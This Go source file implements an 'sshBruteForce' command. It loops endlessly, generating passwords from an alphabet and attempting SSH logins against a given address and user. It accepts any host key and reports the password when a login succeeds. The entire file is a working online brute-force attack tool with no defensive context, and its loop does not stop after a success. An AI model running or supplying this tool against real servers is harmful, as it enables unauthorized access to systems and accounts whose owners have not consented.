package commands

import (
	"fmt"
	"net"
	"runtime"
	"strconv"

	tm "github.com/buger/goterm"
	"github.com/ngirot/BruteForce/bruteforce/words"
	"golang.org/x/crypto/ssh"
)

type SshBruteForceCommand struct {
	name string
}

func (command SshBruteForceCommand) GetName() string {
	return "sshBruteForce"
}

func (command SshBruteForceCommand) String() string {
	return "<Command 'sshBruteForce'>"
}

var trys = 0

func (command SshBruteForceCommand) Execute(args []string) {
	address := args[0]
	user := args[1]
	fmt.Println()
	for true {
		result, err := trySSHConnection(address, user)
		if result {
			fmt.Println("Success, your password is: " + currentPassword)
		} else {
			trys++
			tm.Println("Trys: " + strconv.Itoa(trys) + ";Error: " + err.Error() + "; Current Password: " + currentPassword)
			tm.Flush()
		}
	}
}

var alphabet = words.DefaultAlphabet()
var numberOfChans = runtime.NumCPU()*2 + 1
var worder = words.NewWorder(alphabet, numberOfChans, 0)
var currentPassword = ""

func trySSHConnection(address string, user string) (result bool, erro error) {

	currentPassword = worder.Next()

	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(currentPassword),
		},
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil
		},
	}

	conn, err := ssh.Dial("tcp", address, config)
	if err != nil {
		result = false
		erro = err
		return
	}
	defer conn.Close()
	result = true
	erro = nil
	return
}
